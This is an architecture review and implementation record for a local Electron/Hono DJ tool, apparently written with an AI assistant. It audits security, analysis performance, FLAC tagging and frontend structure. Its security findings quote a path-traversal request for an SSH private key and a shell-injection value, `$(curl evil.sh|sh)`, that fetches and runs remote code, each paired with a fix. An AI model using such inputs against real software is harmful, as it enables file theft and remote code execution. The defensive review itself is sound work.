# WebDeeJayTools - Architecture Review & Improvement Plan

> **Status: implemented.** Every P0, P1, and P2 item below was applied on branch `feature/playlists`.
> The findings are kept as written for the record; see **Section 9 - Implementation record** at the
> end for what shipped, what changed shape during implementation, and what was deliberately left.
>
> Verification after the changes: `pnpm test` 81 passing (was 41), `tsc --noEmit` clean across
> `src`, `electron` and `tests`, `pnpm run build:all` clean.

Reviewer role: second opinion, external architect.
Scope reviewed: `README.md`, `CLAUDE.md`, `ARCHITECTURE.md`, `doc/ARCHITECTURE.md`, `doc/PLAN.md`, and the full `src/`, `electron/`, `tests/`, `.github/` tree at commit `650c110` (branch `feature/playlists`).
Nothing in the code was modified. This is a plan, not a patch.

---

## 0. Overall verdict

The project does what its documentation says it does, and the core engineering decisions are sound for the stated intent (local-first, zero cloud, portable-from-USB DJ tooling).

What is genuinely good and should not be changed:

- **Zero native dependencies.** No `better-sqlite3`, no `ffmpeg` binary, no `essentia`/`aubio` bindings. This is the single decision that makes the portable `.exe` / `.AppImage` claim actually true. A pure-JS Radix-2 FFT and a JSON store are the right trade for this product, even though both are slower than the native alternatives.
- **Adapter + registry pattern** (`src/server/services/base/adapter.ts`, `registry.ts`) for streaming services. Adding Tidal (Phase 8) is a new folder plus one registry line. The abstraction is correctly placed and is not over-built.
- **Shared pure logic in `src/shared/`** (`harmonic.ts`, `playlistExporter.ts`, `types.ts`) usable from both client and server, and it is the part that is actually unit-tested. Correct choice of what to test.
- **Hono over Express.** Web-standard `Request`/`Response` means the range-streaming handler in `routes/mp3.ts` is portable and the same app object embeds cleanly in Electron. CLAUDE.md still says Express; the code is better than the doc.
- **SSE over WebSockets** for one-way progress, with throttling in the downloader. Right tool, right reason.
- **Documentation quality is unusually high** - the DSP formulations in `ARCHITECTURE.md` are correct and match the implementation.

Where the architecture is under strain, in order of importance:

1. Server-side path handling is unguarded (security).
2. CPU-bound DSP runs on the HTTP event loop (scalability of the stated Phase 8 features).
3. FLAC tagging does not do what the docs claim (correctness / risk to user files).
4. The analyzer writes fallback data to disk as if it were measured (data integrity).
5. The client is one 2755-line component with no router and no shared state layer (maintainability of the backlog).
6. Mobile is claimed by implication ("web app") but not implemented.

Ratings by dimension, 1-5:

| Dimension | Rating | One-line justification |
| :--- | :---: | :--- |
| Fitness to stated intent | 4.5 | Delivers the three shipped modules end to end. |
| Backend structure | 4 | Clean layering, good adapters, thin routes. |
| Frontend structure | 2.5 | One monolithic page, no router, prop-drilled state. |
| Security | 2 | Unvalidated filesystem paths on read, write, and delete. |
| Portability | 4 | Real portable story; two remote-asset leaks break offline. |
| Mobile / responsive | 1.5 | Fixed sidebar, HTML5 drag-drop, desktop-only dialogs. |
| Testability | 3.5 | Good pure-function coverage, zero route/integration tests. |
| Docs | 4.5 | Excellent, but three claims are now ahead of the code. |

---

## 1. Security

The threat model here is not "public internet server". It is: a local HTTP server, bound to loopback, with full filesystem authority, reachable by **any web page the user has open in any browser on that machine**. That is a real threat model, and it is the one this codebase is currently exposed to.

### 1.1 Arbitrary filesystem read via `path` query parameter - HIGH

`src/server/routes/mp3.ts` `GET /api/mp3/stream` and `GET /api/mp3/artwork` take a caller-supplied absolute path and stream it back with no containment check:

```ts
const filePath = c.req.query('path');
const fileStream = fs.createReadStream(filePath, { start, end });
```

`GET http://127.0.0.1:34567/api/mp3/stream?path=C:\Users\me\.ssh\id_rsa` returns the file. Both are `GET` with no custom header, so they are reachable as `<audio src=...>` / `<img src=...>` from any origin - no CORS preflight, no user interaction. In the Electron build the port is the fixed, guessable `34567`.

**Fix:** resolve the requested path and require it to be inside an allow-list of roots (`defaultLibraryDir`, `defaultDownloadDir`, plus any directory the user explicitly picked this session via the native dialog). Reject anything else with 403.

```ts
// sketch - src/server/util/paths.ts
export function assertInsideAllowedRoots(candidate: string, roots: string[]): string {
  const resolved = path.resolve(candidate);
  const ok = roots.some((root) => {
    const rel = path.relative(path.resolve(root), resolved);
    return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel));
  });
  if (!ok) throw new Error('Path outside allowed roots');
  return resolved;
}
```

Use `path.relative` rather than `startsWith`, so `C:\library-evil` is not accepted as being inside `C:\library`.

### 1.2 Arbitrary file deletion and move - HIGH

`POST /api/mp3/delete` -> `deleteTracks()` calls `fs.promises.unlink` on every path in the body with no containment check, and then `cleanEmptyDirectories` walks *upward* removing empty directories. `POST /api/mp3/create-dj-set` likewise `rename`s arbitrary sources to an arbitrary `targetDirectory`.

These are `POST` with `Content-Type: application/json`, so a browser forces a CORS preflight and a plain cross-origin page cannot reach them today. That is an accident of content-type negotiation, not a control. It stops being true the moment any CORS middleware is added, and it never applied to a malicious local process.

**Fix:** same allow-list guard as 1.1, applied in the service layer (`djset.ts`), not only at the route. Also cap `cleanEmptyDirectories` recursion explicitly at `sourceDirectory` and refuse to run at all when `sourceDirectory` is absent - today an absent `sourceDirectory` skips cleanup, which is safe, but the invariant is implicit rather than enforced.

### 1.3 No Origin / Host validation on the local server - MEDIUM

The embedded server has no CORS policy, no `Origin` check, and no `Host` header check. A fixed loopback port with no `Host` validation is the classic DNS-rebinding target: an attacker-controlled domain re-resolved to `127.0.0.1` gets same-origin access to every route, including account credentials.

**Fix:** one Hono middleware, before all routes:

- Reject any request whose `Host` header is not `127.0.0.1:<port>` or `localhost:<port>`.
- Reject any request with an `Origin` header that is not the app's own origin (an absent `Origin` on same-origin `GET` is fine).
- Optionally generate a per-launch random token, inject it into the served `index.html`, and require it as a header on every mutating route. Cheap, and it closes the local-process case too.

Bind to `127.0.0.1` in the Vite dev path as well, not just Electron.

### 1.4 Shell interpolation in the folder picker - MEDIUM

`src/server/routes/settings.ts` builds shell command strings from request-body values:

```ts
await execAsync(`zenity --file-selection --directory --title="${dialogDesc.replace(/"/g, '\\"')}" ...`);
await execAsync(`osascript -e 'POSIX path of (choose folder with prompt "${dialogDesc.replace(/"/g, '\\"')}")'`);
```

Escaping only `"` inside a double-quoted shell string leaves `$(...)`, backticks, and `\` live. A `title` of `$(curl evil.sh|sh)` executes on macOS and Linux. The Windows branch is correct - `-EncodedCommand` with doubled single quotes is the right pattern; the POSIX branches did not get the same care.

**Fix (two parts, either sufficient, both preferred):**

1. Replace `exec` with `execFile('zenity', ['--file-selection', ...])` and `execFile('osascript', ['-e', script])` so no shell parses the string.
2. Better: in the Electron build, do not shell out at all. Use `dialog.showOpenDialog` over IPC - `doc/ARCHITECTURE.md` already claims this is what happens. Keep the shell path only as the browser-mode fallback.

### 1.5 Credentials stored in plaintext - MEDIUM, partly by design

`data/db.json` holds `user_auth_token` and Spotify `clientSecret` in clear text. For a portable USB tool this is a deliberate and defensible trade - a lost stick is a lost stick either way, and OS keychains do not travel. But it should be a *documented* trade, not a silent one.

**Recommend:**
- State it plainly in `README.md` and `doc/ARCHITECTURE.md`: "credentials are stored unencrypted in `data/db.json`; treat the USB drive as a credential."
- Never return raw credentials from `GET /api/accounts`. Today the full `Account` including `credentials` goes to the client on every page load. Return a redacted projection (`hasToken: true`, last 4 chars) and keep secrets server-side.
- Optional: passphrase-derived encryption (`scrypt` + `AES-256-GCM`, both in Node core, no new dependency) with the passphrase prompted at launch. Fits the zero-native constraint.

### 1.6 Electron hardening - LOW

`sandbox: false` is set with no `preload` script that needs it. `contextIsolation: true` and `nodeIntegration: false` are correct. There is no CSP on the served `index.html`, and the renderer loads fonts from `fonts.googleapis.com`.

**Fix:** set `sandbox: true`, add a restrictive `Content-Security-Policy` meta tag (`default-src 'self'`, plus the specific image hosts needed for remote cover art), and see 4.2 on the fonts.

### 1.7 No input validation layer - LOW-MEDIUM

`CLAUDE.md` promises "shared types, **schemas**, and pure utility functions" in `src/shared/`. There are types but no schemas, and no validation library is installed. Every route does `await c.req.json()` and casts:

```ts
const body = (await c.req.json()) as CreateDjSetRequest;
```

A TypeScript cast is a compile-time assertion over runtime-untrusted data. `PUT /api/settings` in particular writes the entire request body into `db.json` unfiltered.

**Fix:** add `zod`, define the request schemas next to the types in `src/shared/`, and `parse()` at every route boundary. Roughly 150 lines total, and it makes the allow-listing in 1.1/1.2 enforceable in one place.

---

## 2. Backend architecture and performance

### 2.1 CPU-bound DSP blocks the event loop - HIGH for the Phase 8 backlog

`POST /api/mp3/analyze` and `/analyze-stream` loop over `filePaths` and `await analyzeAudioTrack` sequentially, on the main thread. `decodeAudio`, `applyLowPassFilter`, the autocorrelation double loop, and 60 FFT frames are all synchronous.

Consequences, all of which get worse exactly as the roadmap advances:

- One 500-track batch analysis freezes the entire server: no artwork, no audio preview, no SSE heartbeat, no settings save. Even the "real-time progress" SSE only flushes between tracks.
- Zero multi-core use. `ARCHITECTURE.md` claims "multi-core execution" as a reason for putting DSP on the backend - that claim is currently false.
- No cancellation. Once a batch starts, the only way out is killing the app.

**Fix, in order:**
1. Move `analyzeAudioTrack` into a `worker_threads` pool sized `min(4, os.cpus().length - 1)`. The analyzer is already a pure `(path) -> result` function, so this is a mechanical change with no redesign.
2. Convert `/analyze-stream` from a synchronous loop into a job: `POST` enqueues and returns a job id, SSE streams that job's progress, `DELETE` cancels. This also survives a page reload, which the current design does not.
3. Reuse the existing `DownloadQueue` shape - it already has concurrency, events, and status. An `AnalysisQueue` sibling keeps one queue idiom in the codebase rather than two mechanisms for the same thing.

### 2.2 The 8 MB read window breaks hi-res analysis - MEDIUM

`analyzer.ts` reads at most 8 MB from the head of the file, then asks for the 15s-45s window:

```ts
const readSize = Math.min(fileStat.size, 8 * 1024 * 1024);
const startSample = Math.min(Math.floor(sampleRate * 15), Math.floor(totalSamples * 0.2));
const maxSamples = Math.min(totalSamples - startSample, sampleRate * 30);
```

For 320kbps MP3, 8 MB is about 200 seconds - fine. For FLAC 24/192 (which this app downloads, and advertises), 8 MB is roughly 6-8 seconds of audio. The `totalSamples * 0.2` clamp then leaves 5-6 seconds of PCM for a BPM autocorrelation that wants tens of seconds, and for a chromagram that then sees only the intro. Hi-res files - the product's headline format - get the worst analysis quality.

**Fix:** size the read window from the actual bitrate rather than a flat byte count. Parse `format.bitrate`/`sampleRate` with `music-metadata` first (already a dependency, already used by the scanner), then read `bitrate/8 * 60` bytes, capped. Better still, seek to the middle of the file: `decodeAudio` needs frame-aligned data, so for MP3 scan forward to the next frame sync; for FLAC read from the header plus an offset. That is more work - the pragmatic first step is bitrate-aware sizing.

### 2.3 The analyzer writes guessed values as if measured - HIGH for data integrity

`detectBpmFromPcm` returns `{ bpm: 128, confidence: 0 }` on short or unusable input. `detectKeyFromPcm` returns `{ key: 'C', camelotKey: '8B', confidence: 0 }`. Nothing downstream checks `confidence`:

- `analyzeAudioTrack` calls `saveTrackTags(path, 128, '8B')` when `writeTags` is on.
- The route counts it: `if (res.bpm && res.camelotKey) successCount++`.

So a file that failed analysis gets a confident-looking `TBPM=128` / `TKEY=8B` written **permanently to the user's library**, and is reported as a success. For a DJ tool this is worse than no value - a wrong key silently ruins harmonic mixing and there is no way to tell it apart from a real detection.

**Fix:**
- Return `bpm: null, key: null` on failure. Let the type carry the failure, not a sentinel.
- Refuse to write tags below a confidence threshold; surface "low confidence, not written" in the UI.
- Fix `successCount` to count actual detections.

### 2.4 Confidence is not a confidence - MEDIUM

`confidence: Math.min(1, Math.max(0, maxCorr * 10))` where `maxCorr` is an un-normalized autocorrelation over an un-normalized onset envelope. Its magnitude scales with track loudness, so a loud track reports high confidence regardless of how peaked the autocorrelation actually is. The composite `(bpmConfidence + keyConfidence) / 2` then mixes it with a Pearson r, which *is* bounded and meaningful.

**Fix:** define BPM confidence as peak prominence - the best correlation divided by the mean (or second-best) correlation across the lag range. That is scale-invariant, and it is the number that actually predicts whether the tempo is right. The `correlations` array is already being built and then discarded; the data is there.

### 2.5 FLAC tagging does not match the documentation - HIGH

`ARCHITECTURE.md` section 4 states: "**FLAC Vorbis Comments**: Persists `BPM` and `INITIALKEY` blocks", and `doc/ARCHITECTURE.md` 5.2 claims "injects standard Vorbis comments and embedded album artwork". `CLAUDE.md` lists "Vorbis comments for FLAC" as a stack rule.

The code does neither. `tagger.ts` and `analyzer.ts` both call `node-id3` on `.flac` files. `node-id3` writes an ID3v2 container; it has no Vorbis implementation. The comment in `tagger.ts` is candid about this:

```ts
// For FLAC files, node-id3 or flac metadata can be appended/handled
// If Vorbis comment writer is available or raw ID3 tag appended
NodeID3.write(tags, filePath);
return true;  // returns true whether or not anything worked
```

Consequences:
- An ID3v2 block prepended before the `fLaC` magic bytes is out of spec. Tolerant decoders skip it; strict ones (and some hardware CDJ firmware) see a malformed file. This is the app writing to files the user cannot easily re-download.
- Rekordbox and Serato read Vorbis `BPM`/`INITIALKEY` from FLAC. They will not see these tags. The headline Phase 8 feature - "instant CDJ / DJ software recognition" - does not work for the lossless format the app is built around.
- The FLAC branch returns `true` unconditionally, including in `catch`. The UI reports success for a write that did nothing.

**Fix:** implement a real Vorbis comment writer, or take a dependency that has one. A minimal `VORBIS_COMMENT` block rewriter is roughly 150 lines against the FLAC metadata block spec and keeps the zero-native rule. Until then, the honest interim is to **refuse** to tag FLAC, return `false`, and say so in the UI - rather than silently writing a non-standard container. Correct the three documents either way.

### 2.6 JSON store concurrency - MEDIUM

`JsonStore` loads once into memory in the module-level singleton and rewrites the whole file on every mutation. Two issues:

- **Full-file rewrite on every change.** With `djSets` and the planned library index, `db.json` grows, and `listDjSets()` calls `addOrUpdateDjSet` (a full persist) once per discovered folder - an O(n) scan does O(n) full-file writes.
- **The "atomic" write is not atomic.** `saveData` does `unlink(dbPath)` then `rename(tmp, dbPath)`. Between those two calls the database does not exist; a crash there loses every account. The `copyFileSync` fallback has the same window. `ARCHITECTURE.md` calls this "atomic rename semantics" - on POSIX, `rename` over an existing file *is* atomic and the `unlink` should simply be dropped. On Windows, `fs.renameSync` over an existing file also succeeds; the `unlink` is a workaround for a problem that a retry loop solves better.

**Fix:** drop the `unlink`, keep write-temp-then-rename, add a bounded retry on `EPERM`/`EBUSY` for the Windows antivirus case. Batch `listDjSets` into one persist at the end. If the library index lands in Phase 8, move *that* to its own file (`data/library-index.json`) - do not let a 10k-track index share a file with credentials that are rewritten on every settings toggle.

### 2.7 Downloader queue robustness - LOW

`DownloadQueue` is a reasonable design. Gaps: the queue is in-memory only (an app restart loses it, and the SSE client is told nothing about the discontinuity), `enqueue` captures `quality`/`downloadDir` per call but `processQueue` re-applies the most recent call's settings to *all* queued items including ones enqueued with different settings, and there is no per-item cancel. Worth addressing when the queue is generalized for 2.1.

### 2.8 Route-layer test coverage is zero - MEDIUM

836 lines of tests, all against pure functions in `shared/` and the services. Not one test constructs a `Request` and runs it through the Hono app - and Hono makes that trivial (`app.request('/api/mp3/scan', {...})`, no server needed). Every finding in section 1 is a route-layer finding, so the untested layer is exactly the risky one.

**Fix:** add `tests/routes/*.test.ts` with `app.request()`. The first tests to write are the path-traversal rejections from 1.1 and 1.2 - they turn the security fix into a regression-proof invariant.

---

## 3. Frontend architecture

### 3.1 `Mp3Management/index.tsx` is 2755 lines - HIGH for backlog velocity

One component, 56 `useState` calls, 68 hook calls total, no `useReducer`, no context, no extracted subcomponents. It is 26% of the entire codebase and larger than the whole server `services/` tree.

Every remaining Phase 8 item (duplicate detection, batch tag editing, genre/mood playlist building, Rekordbox XML export UI) lands in this file. It roughly doubles.

**Fix - decompose along the seams already visible in the file:**

```
pages/Mp3Management/
  index.tsx              # orchestration + layout only, target < 200 lines
  useLibrary.ts          # scan, filter, sort, selection state
  useAnalysis.ts         # SSE analysis progress state
  useDjSet.ts            # set creation, reorder, export
  components/
    TrackTable.tsx
    TrackRow.tsx
    LibraryToolbar.tsx
    AnalysisModal.tsx
    DjSetPanel.tsx
    ExportMenu.tsx
```

Hooks first, components second - state extraction is what actually makes the file shrink. There is no need for a state-management library; `useReducer` plus two or three custom hooks fits the shape of this data.

### 3.2 No router - MEDIUM

`activeTab` is `useState` in `App.tsx`. Costs: no deep links, browser back exits the app instead of navigating, no reload-into-the-view-you-were-on, no per-view code splitting (so a browser-mode user downloads the entire 2755-line MP3 module to look at the Converter).

**Fix:** `react-router` in hash mode. Hash mode works identically under `file://`, Electron, and the dev server, so it does not disturb the portable story. Then `React.lazy` per route.

### 3.3 No data-fetching layer - MEDIUM

`App.tsx` fetches accounts and settings once and prop-drills them into all four pages, with an `onAccountsUpdated` callback threaded back up to force a full reload. Each page then does its own ad-hoc `useState` + `fetch` + manual loading and error flags. There is no cache, no de-duplication, and no consistent error surface - `loadData` swallows failures into `console.warn`, so a backend that is down renders as a silently empty UI.

**Fix:** either TanStack Query (about 13 kB gzipped, gives caching, retries, and invalidation for free) or a small hand-rolled `useResource` hook plus a React context for accounts/settings. Given the app's size, the hand-rolled version is defensible - the requirement is not the library, it is *one* place that owns fetch state and *one* visible error surface.

### 3.4 No error boundary, no global error surface - MEDIUM

No `ErrorBoundary` anywhere. A render throw in the MP3 page white-screens the entire Electron window with no reload affordance. Server errors are variously `alert()`ed, `console.warn`ed, or dropped.

**Fix:** one `ErrorBoundary` around `<main>` with a reload button, plus a toast component for API errors. Replace `alert()` - it blocks the Electron main thread and cannot be styled.

### 3.5 Accessibility - LOW-MEDIUM

No `aria-label` on icon-only buttons, modals lack `role="dialog"`/focus trap/Escape handling, drag-and-drop reordering has no keyboard equivalent, and the palette leans on low-contrast slate-on-near-black (`text-slate-400` on `#0d1322` is around 4.2:1 - under WCAG AA for small text). For a tool used in a dark club with a laptop screen at an angle, contrast is a practical concern, not only a compliance one.

---

## 4. Portability

The portable story is real and well executed - `PORTABLE_EXECUTABLE_DIR` detection, relative `data/` and `downloads/`, `EXDEV` fallback for cross-drive moves in `djset.ts`, and the AppData-temp-path sanitizing in `store.ts` are all the marks of someone who actually ran this off a USB stick. Three leaks:

### 4.1 Path separator and case-folding assumptions - LOW

`store.ts` sanitizes with a hardcoded Windows separator:

```ts
if (settings.defaultDownloadDir.includes('AppData\\Local\\Temp'))
```

Harmless today (AppData is Windows-only) but it is the kind of check that gets copied. Prefer normalizing with `path.sep` or testing against `os.tmpdir()`.

Elsewhere, `djset.ts` and `store.ts` compare paths with `.toLowerCase()`, which is correct for Windows and NTFS but wrong on case-sensitive Linux volumes - `Track.flac` and `track.flac` are two different files there and would be treated as one. Make case-folding conditional on `process.platform`.

### 4.2 Remote fonts break offline use - MEDIUM

`index.html` loads Inter and JetBrains Mono from `fonts.googleapis.com`. On a USB stick at a venue with no wifi - the exact scenario the product is built for - the app falls back to system fonts, and every launch stalls on two DNS lookups and a stylesheet fetch. It is also an outbound request per launch from a tool that advertises "zero cloud dependencies".

**Fix:** self-host the two woff2 files (about 90 kB total), `@font-face` them in `index.css`, drop the preconnects. Pure win: faster, offline, private, and it makes the "zero cloud" claim literally true.

### 4.3 Dead browser-automation dependencies - LOW

`vite.electron.config.ts` still externalizes `playwright`, `playwright-extra`, `puppeteer-extra-plugin-stealth`, and `better-sqlite3`. None are imported by the source any more - `browser-auth.ts` was reduced to pure string parsing plus two functions that throw. Those packages are still in `devDependencies`, adding several hundred MB to `node_modules` and slowing CI installs, for dead code paths.

**Fix:** remove the dependencies and their externals. Delete `loginQobuzAutomated` and `readLocalBrowserSession`, which exist only to throw, along with the now-dead imports in `routes/accounts.ts`.

---

## 5. Mobile and responsive

The README calls this "a local web app". As shipped, it is a desktop app that runs in a browser. If mobile is not a goal, that is a perfectly reasonable scope decision - but the docs should say so, because right now a phone-sized viewport is close to unusable.

Concretely:

- **`Sidebar.tsx` has zero responsive classes.** `w-64 h-screen ... shrink-0` inside `App.tsx`'s `flex h-screen`. On a 375px viewport the nav consumes 68% of the width and the content area gets 119px. No hamburger, no drawer, no collapse.
- **Responsive prefix counts:** Sidebar 0, Converter 1, Downloader 1, Admin 2, Mp3Management 13 - across 2755 lines. Most grids are unprefixed `grid-cols-2` / `grid-cols-3`, which stay multi-column at 375px and overflow.
- **The track table** relies on a single `overflow-x-auto` wrapper with `min-w-[240px]` cells. Horizontal scrolling a 10-column table is not a mobile pattern.
- **Drag-and-drop reordering uses the HTML5 drag API** (`onDragStart`/`onDragOver`/`onDrop`). This API does not fire on touch devices at all. The reorder feature is not degraded on mobile - it is entirely absent, with no visible reason and no alternative.
- **Audio preview is the one thing that would work well on a phone**, since it is a plain range-served `<audio>` element.
- **Native folder pickers cannot work in a mobile browser.** `POST /api/settings/browse-folder` shells out to PowerShell / osascript / zenity on the *server*, which is correct for the local-desktop case and meaningless when the server is a laptop and the client is a phone.

**Recommended scope - pick one and write it down:**

*Option A (recommended): "responsive, not mobile-first."* Make the app usable on a tablet and survivable on a phone. Roughly a day:
1. Sidebar becomes `hidden md:flex` plus a drawer behind a hamburger below `md`.
2. Audit every unprefixed `grid-cols-N` to `grid-cols-1 sm:grid-cols-2 lg:grid-cols-N`.
3. Track table becomes a card list below `md` (title/artist/BPM/key stacked), table at `md` and up.
4. Swap HTML5 drag for a pointer-event based reorder (`@dnd-kit/core` handles mouse, touch, and keyboard), or expose explicit up/down buttons as the touch path.
5. `min-h-screen` instead of `h-screen` and safe-area padding, so mobile browser chrome does not clip the footer.
6. Hide the folder-picker button when not in Electron; fall back to a text input.

*Option B: declare desktop-only.* Add a "designed for desktop" line to the README and a viewport-width notice below `md`. Cheaper, and honest.

---

## 6. Documentation

The docs are a strength - keep the DSP write-ups, they are correct and rare. Three corrections and one structural note:

1. **`ARCHITECTURE.md` section 4 and `doc/ARCHITECTURE.md` 5.2**: FLAC Vorbis comments are claimed but not implemented (2.5). Correct or implement.
2. **`ARCHITECTURE.md` section 2**: "multi-core execution" as a rationale for backend DSP is not true today (2.1). Either implement the worker pool or reword to "direct file access and direct tag writing".
3. **`CLAUDE.md`**: says Express; the code uses Hono. Says `src/shared/` holds "schemas"; there are none. Also worth adding a rule to the effect of "all filesystem paths crossing the API boundary must be validated against the allowed roots" - it is the invariant this codebase most needs written down.
4. **Two `ARCHITECTURE.md` files** (root and `doc/`) with overlapping and now-diverging content. Keep `doc/ARCHITECTURE.md` as canonical and make the root file a pointer, or merge.

Also: `doc/TODO.md` is referenced by `CLAUDE.md` but does not exist.

---

## 7. Prioritized plan

Ordered by risk-adjusted value. Estimates assume one developer familiar with the codebase.

### P0 - do before any wider distribution

| # | Item | Section | Estimate |
| :-- | :--- | :--- | :--- |
| 1 | Path allow-listing on `stream`, `artwork`, `delete`, `create-dj-set`, `scan` | 1.1, 1.2 | 4 h |
| 2 | Host/Origin middleware on the local server | 1.3 | 2 h |
| 3 | `execFile` (or Electron IPC dialog) for the folder picker | 1.4 | 2 h |
| 4 | Stop writing fallback BPM/key to disk; gate tag writes on confidence | 2.3 | 2 h |
| 5 | FLAC: either write real Vorbis comments or refuse and report honestly | 2.5 | 1 h to refuse, 1-2 d to implement |
| 6 | Route-level tests for 1 and 2 via `app.request()` | 2.8 | 4 h |

### P1 - do before Phase 8 lands

| # | Item | Section | Estimate |
| :-- | :--- | :--- | :--- |
| 7 | `worker_threads` pool for analysis; job-based SSE with cancel | 2.1 | 2 d |
| 8 | Bitrate-aware read window for hi-res analysis | 2.2 | 4 h |
| 9 | Decompose `Mp3Management` into hooks plus components | 3.1 | 2-3 d |
| 10 | `zod` request schemas at every route boundary | 1.7 | 1 d |
| 11 | Redact credentials from `GET /api/accounts` | 1.5 | 2 h |
| 12 | Fix `saveData` unlink-then-rename window; batch `listDjSets` persists | 2.6 | 3 h |
| 13 | Self-host fonts; drop dead Playwright/Puppeteer dependencies | 4.2, 4.3 | 2 h |

### P2 - quality and reach

| # | Item | Section | Estimate |
| :-- | :--- | :--- | :--- |
| 14 | Hash router plus lazy routes | 3.2 | 4 h |
| 15 | Responsive pass, Option A | 5 | 1 d |
| 16 | Error boundary plus toast layer; remove `alert()` | 3.4 | 4 h |
| 17 | Data-fetching layer (context or TanStack Query) | 3.3 | 1 d |
| 18 | BPM confidence as peak prominence | 2.4 | 3 h |
| 19 | Accessibility pass: aria-labels, focus traps, contrast | 3.5 | 1 d |
| 20 | Documentation corrections; merge the two ARCHITECTURE files | 6 | 2 h |

---

## 8. Things deliberately not recommended

Listed so they do not get raised again later:

- **Do not add a real database.** SQLite means a native dependency and kills the portable binary. The JSON store is the right call; it needs fixes (2.6), not replacement. If the library index outgrows it, use a separate append-friendly JSON or NDJSON file, still zero-native.
- **Do not move DSP to the browser via WebAudio.** Server-side is correct: it has direct file access, no upload, and can write tags. The problem is threading, not location.
- **Do not adopt Redux/Zustand/Jotai.** Four views and one complex page do not need a store. Custom hooks plus one context is the right size.
- **Do not split client and server into separate packages yet.** The single Vite project with `@hono/vite-dev-server` gives a genuinely good dev loop. Revisit only if a second frontend (mobile, CLI) appears.
- **Do not replace the hand-rolled FFT.** It is correct, dependency-free, and fast enough. The performance problem is that it monopolizes the event loop (2.1), not the transform itself.


---

## 9. Implementation record

All twenty items were implemented. Notes below cover only where the implementation differs from the
recommendation, or where doing the work turned up something the review missed.

### New modules

| Module | Purpose |
| :--- | :--- |
| `src/server/util/paths.ts` | Filesystem containment guard, session-granted roots, platform-correct case folding |
| `src/server/util/validate.ts` | zod body/query parsing and a single error-to-HTTP mapping |
| `src/server/util/redact.ts` | Strips credential values before an account crosses the API boundary |
| `src/server/middleware/localGuard.ts` | Host/Origin allow-list, per-launch session token |
| `src/server/services/tagging/flac.ts` | FLAC metadata reader/writer: Vorbis comments and `PICTURE` |
| `src/server/services/tagging/safeWrite.ts` | Two-phase copy-verify-swap file replacement |
| `src/server/services/tagging/index.ts` | Container-aware tag dispatch with read-back verification |
| `src/server/services/mp3/analysisPool.ts` | `worker_threads` pool with an in-process fallback |
| `src/server/services/mp3/analysisQueue.ts` | Cancellable analysis jobs with SSE observers |
| `src/shared/schemas.ts` | zod request schemas |
| `src/client/context/AppDataContext.tsx` | Owns accounts and settings; single visible error surface |
| `src/client/components/Toast.tsx`, `ErrorBoundary.tsx` | Notification and crash surfaces |
| `src/client/pages/Mp3Management/use*.ts`, `components/TrackTable.tsx` | Decomposed MP3 view |

### Where implementation diverged from the recommendation

1. **Two-phase verified tag writes (added at the user's request, beyond the original review).**
   Every tag write now copies the file, mutates the copy, re-parses it, checks the container and
   duration are unchanged, reads the intended tags back out, and only then swaps it over the
   original - with the original moved aside to a backup until the swap succeeds. A rejected write
   leaves the original byte-identical. This subsumes finding 2.5's risk entirely: the FLAC writer
   could be wrong and the user's files would still survive.

   One subtlety worth recording: an early version relaxed verification when the candidate could not
   be parsed as audio, which silently skipped a caller's `verifyTags` assertion. That is exactly the
   "reports success for a write that did nothing" failure the review complained about, reintroduced
   from the other side. The rule now is: if tag verification was requested, an unparseable candidate
   is a failure, because we cannot prove the tags landed.

2. **Path allow-listing needed a session-grant concept.** A pure "library + downloads" allow-list
   would have broken the legitimate workflow of scanning an arbitrary folder. Directories the user
   explicitly picks in the native dialog, or explicitly scans, become allowed roots for the life of
   the process - and nothing else does. Grants are deliberately not persisted to `db.json`.

3. **`assertAllowedPath` also resolves symlinks** when the target exists, and re-checks the resolved
   path, so a link planted inside the library cannot be used to escape it. The review did not
   mention this.

4. **The worker pool degrades rather than requiring a build step in dev.** `worker_threads` needs a
   real file on disk, which only exists in the packaged build (Vite emits `analysis-worker.js` as a
   second entry). Under the dev server the pool runs in-process but yields to the event loop between
   tracks, so the API keeps responding either way. Same public API in both modes.

5. **Analysis became a job rather than a request.** Beyond the recommended worker pool, the batch is
   now a server-side job with its own id, observable over SSE and cancellable. A page reload no
   longer abandons a half-finished batch with tags partially written.

6. **`analyze` route counting was wrong in a way the review understated.** `successCount` counted the
   128 BPM / 8B fallback as a success, so the UI reported a fully successful batch for a run in which
   nothing was detected. Fixed alongside the null-return change.

7. **MP3 view decomposition is hooks-first, as recommended, and stopped there deliberately.**
   `index.tsx` went from 2755 to ~2035 lines, with all state logic moved into four hooks plus a
   `TrackTable` component. The remainder is modal markup. Extracting those modals is mechanical but
   would mean rewriting ~1500 lines of working JSX with no way to visually verify the result in this
   pass; the state extraction is what actually makes the file tractable, and the modals now sit on
   top of hooks that can be tested independently.

8. **A bug of my own, recorded because the class of it matters.** The first FLAC writer packed the
   metadata block header with `(0x80 << 24) | ...`, which is negative under JavaScript's signed
   32-bit bitwise operators, so `writeUInt32BE` threw. Caught by the new unit tests before it went
   anywhere near a real file - which is the argument for the tests, not against the writer.

### Verification

- `pnpm test`: 81 tests passing across 11 files, up from 41 across 8.
  New: `tests/server/paths.test.ts` (containment, traversal, prefix-sibling), `tests/server/routes.test.ts`
  (16 route-level tests including rebinding, cross-origin, traversal on every file-touching route, and
  a check that credentials never appear in an accounts response), `tests/services/tagging.test.ts`
  (FLAC round-trip, ID3-blob repair, and six two-phase-write failure modes), plus analyzer tests for
  the null-on-failure and loudness-invariant-confidence guarantees.
- `tsc --noEmit` clean, now covering `electron` and `tests` as well as `src`.
- `pnpm run build:all` clean; the client bundle is now route-split.
- Live check against `pnpm dev`: `/api/health` 200, `GET /api/mp3/stream?path=C:\Windows\win.ini`
  403 with no file content in the body, forged `Host` header refused.

### Deliberately not done

- **Credential encryption at rest** (finding 1.5's optional half). The trade is now documented in
  `README.md` and `doc/ARCHITECTURE.md` and credentials no longer leave the server, which addresses
  the part that was a genuine defect. Passphrase-derived encryption remains a real option but changes
  the launch UX, so it is the user's call rather than a silent addition.
- **Downloader queue persistence and per-item cancel** (finding 2.7, rated LOW). The analysis queue
  now demonstrates the shape this should take; converging the two is worth doing when the download
  queue is next touched.
- **Mobile Option B** was not taken. Option A was implemented: the app is now usable on a tablet and
  survivable on a phone.
